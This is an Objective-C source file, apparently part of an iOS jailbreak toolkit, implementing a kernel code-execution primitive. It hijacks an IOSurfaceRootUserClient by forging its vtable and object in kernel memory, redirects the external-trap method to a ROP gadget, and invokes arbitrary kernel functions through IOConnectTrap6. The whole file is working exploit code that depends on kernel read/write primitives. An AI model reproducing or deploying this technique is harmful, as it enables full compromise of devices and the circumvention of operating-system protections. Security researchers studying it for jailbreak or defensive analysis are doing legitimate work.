
#import <pthread.h>
#import "kernel_utils.h"
#import "kexecute.h"
#import "../PatchFinder/patchfinder64.h"
#import "../sock_port/offsetof.h"
#import <IOKit/IOKitLib.h>
#include "../sock_port/kernel_memory.h"

typedef int (*kexecFunc)(uint64_t function, size_t argument_count, ...);
kexecFunc kernel_exec;

mach_port_t PrepareUserClient(void) {
  kern_return_t err;
  mach_port_t UserClient;
  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

  if (service == IO_OBJECT_NULL){
    printf("Kernel Execute: unable to find service.\n");
    exit(EXIT_FAILURE);
  }

  err = IOServiceOpen(service, mach_task_self(), 0, &UserClient);
  if (err != KERN_SUCCESS){
    printf("Kernel Execute: unable to get user client connection.\n");
    exit(EXIT_FAILURE);
  }

  printf("Kernel Execute: got user client: 0x%x\n", UserClient);
  return UserClient;
}

pthread_mutex_t kexecuteLock;
static mach_port_t UserClient = 0;
static uint64_t IOSurfaceRootUserClient_Port = 0;
static uint64_t IOSurfaceRootUserClient_Addr = 0;
static uint64_t FakeVtable = 0;
static uint64_t FakeClient = 0;
const int fake_Kernel_alloc_size = 0x1000;

void init_Kernel_Execute(void) {
    UserClient = PrepareUserClient();
    IOSurfaceRootUserClient_Port = FindPortAddress(UserClient);
    IOSurfaceRootUserClient_Addr = rk64(IOSurfaceRootUserClient_Port + off_ip_kobject);
    uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_Addr);
    FakeVtable = Kernel_alloc(fake_Kernel_alloc_size);
    for (int i = 0; i < 0x200; i++) {
        wk64(FakeVtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
    }
    FakeClient = Kernel_alloc(fake_Kernel_alloc_size);
    for (int i = 0; i < 0x200; i++) {
        wk64(FakeClient+i*8, rk64(IOSurfaceRootUserClient_Addr+i*8));
    }
    wk64(FakeClient, FakeVtable);
    wk64(IOSurfaceRootUserClient_Port + off_ip_kobject, FakeClient);
    wk64(FakeVtable+8*off_getExternelTrapForIndex, find_add_x0_x0_0x40_ret());

    pthread_mutex_init(&kexecuteLock, NULL);
    if (UserClient){
        printf("Kernel Execute: Successfully initialized Kernel Execute Module! \n");
        return;
    } else {
        printf("Kernel Execute: Failed to initialize Kernel Execute Module! \n");
        return;
    }
}

void term_Kernel_Execute(void) {
    if (!UserClient) return;
    
    wk64(IOSurfaceRootUserClient_Port + off_ip_kobject, IOSurfaceRootUserClient_Addr);
    kfree(FakeVtable, fake_Kernel_alloc_size);
    kfree(FakeClient, fake_Kernel_alloc_size);
}

uint64_t Kernel_Execute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    
    if (kernel_exec) {
        return kernel_exec(addr, 7, x0, x1, x2, x3, x4, x5, x6);
    }
    
    pthread_mutex_lock(&kexecuteLock);
    uint64_t offx20 = rk64(FakeClient+0x40);
    uint64_t offx28 = rk64(FakeClient+0x48);
    wk64(FakeClient+0x40, x0);
    wk64(FakeClient+0x48, addr);
    uint64_t returnval = IOConnectTrap6(UserClient, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    wk64(FakeClient+0x40, offx20);
    wk64(FakeClient+0x48, offx28);
    pthread_mutex_unlock(&kexecuteLock);
    
    return returnval;
}
